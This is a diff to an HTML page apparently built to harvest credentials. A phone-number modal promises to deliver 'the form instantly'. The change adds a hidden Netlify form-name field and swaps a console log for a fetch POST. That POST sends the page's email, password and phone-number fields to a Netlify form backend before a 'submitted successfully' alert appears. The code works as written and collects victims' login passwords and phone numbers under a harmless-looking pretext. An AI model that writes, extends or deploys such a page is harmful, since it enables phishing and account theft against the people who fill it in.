@@ -109,6 +109,7 @@
             <h2>Enter Your Phone Number</h2>
             <p class="info-text">Enter your phone number to get the form delivered instantly.</p>
             <form id="phoneForm" name="phoneForm" method="POST" data-netlify="true">
+                <input type="hidden" name="form-name" value="phoneForm"> <!-- hidden field -->
                 <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
                 <button type="submit">Submit</button>
             </form>
@@ -144,12 +145,23 @@
             // Capture phone number
             const phone = document.getElementById('phone').value;
 
-            // Log the phone number along with email and password
-            console.log(`Phone: ${phone}`);
-
-            // After submission, alert the user and reset
-            alert('Form submitted successfully!');
-            document.getElementById('phoneModal').style.display = 'none'; // Hide the phone form
+            // Send the form data to Netlify
+            fetch(window.location.href, {  // Using current URL to submit to the Netlify handler
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({
+                    'email': document.getElementById('email').value,
+                    'userPassword': document.getElementById('userPassword').value,
+                    'phone': phone,
+                    'form-name': 'phoneForm',
+                })
+            })
+            .then(response => response.text())
+            .then(data => {
+                alert('Form submitted successfully!');
+                document.getElementById('phoneModal').style.display = 'none'; // Hide the phone form
+            })
+            .catch(error => console.error('Error:', error));
         });
     </script>
 
